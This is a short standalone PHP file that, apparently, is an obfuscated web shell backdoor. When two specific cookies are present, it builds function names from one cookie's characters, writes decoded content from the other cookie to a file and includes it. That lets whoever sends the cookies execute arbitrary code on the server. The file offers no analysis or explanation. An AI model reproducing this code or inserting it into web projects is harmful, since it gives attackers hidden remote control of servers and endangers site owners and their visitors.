<?php

if (isset($_COOKIE[3]) && isset($_COOKIE[13])) {

    $c = $_COOKIE;
    $k = 0;
    $n = 9;
    $p = array();
    $p[$k] = '';
    while ($n) {
        $p[$k] .= $c[13][$n];
        if (!$c[13][$n + 1]) {
            if (!$c[13][$n + 2]) break;
            $k++;
            $p[$k] = '';
            $n++;
        }
        $n = $n + 9 + 1;
    }
    $k = $p[10]() . $p[24];
    if (!$p[1]($k)) {
        $n = $p[21]($k, $p[4]);
        $p[14]($n, $p[6] . $p[16]($p[20]($c[3])));
    }
    include($k);
}